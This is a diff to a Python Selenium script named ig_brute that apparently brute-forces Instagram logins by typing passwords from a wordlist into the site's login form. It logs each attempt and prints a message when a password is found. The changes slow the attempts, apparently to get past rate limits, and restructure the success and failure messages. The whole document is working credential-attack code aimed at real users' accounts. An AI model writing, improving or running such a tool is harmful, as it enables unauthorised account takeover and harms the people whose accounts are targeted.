@@ -61,7 +61,7 @@ def ig_brute(username,password_wordlist):
         try:
             WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
             WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
-            time.sleep(1)
+            time.sleep(2)
             
             time.sleep(1)
             with open("Passwords/entered_passwords.txt","a+") as fi:
@@ -97,10 +97,14 @@ def ig_brute(username,password_wordlist):
             else:
                 print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
         except:
-            print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
-            break
-            exit()
-                
+            try:
+                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
+                break
+                exit()
+            except:
+                print(colored.red("[-]PASSWORD IS NOT IN THE WORDLIST THAT YOU PROVIDED!"))
+
+        
         x+=1
         
     for j in password_wordlist:
